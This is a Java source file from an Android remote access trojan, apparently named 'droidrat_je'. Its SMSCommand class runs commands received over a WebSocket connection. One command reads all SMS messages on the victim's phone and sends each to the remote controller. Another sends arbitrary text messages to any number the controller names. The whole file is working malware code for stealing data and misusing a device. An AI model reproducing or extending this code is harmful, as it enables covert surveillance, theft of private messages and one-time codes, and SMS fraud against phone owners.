package com.je_chen.droidrat_je.rat.command;


import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.sms.SMS;

import java.util.List;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;

public class SMSCommand extends CommandFather {

    private final SMS sms;

    private final Context context;

    public SMSCommand(Context context) {
        sms = new SMS();
        this.context = context;
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "SMS Event ";
            switch (rawCommandArray[1]) {
                case "GetSMS":
                    List<String> smsList;
                    Log.d(TAG, "SMS GetSMS");
                    smsList = sms.getAllSms(context);
                    for (String smsString : smsList) {
                        this.send("SMS GetSMS " + smsString);
                    }
                    break;

                case "SendSMS":
                    String phoneNumber = rawCommandArray[2];
                    String smsText = rawCommandArray[3];
                    Log.d(TAG, "SMS SendSMS " + phoneNumber + "\ntext -> " + smsText);
                    sms.sendSMS(context, phoneNumber, smsText);
                    this.send("SMS SendSMS " + phoneNumber + "\ntext -> " + smsText);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
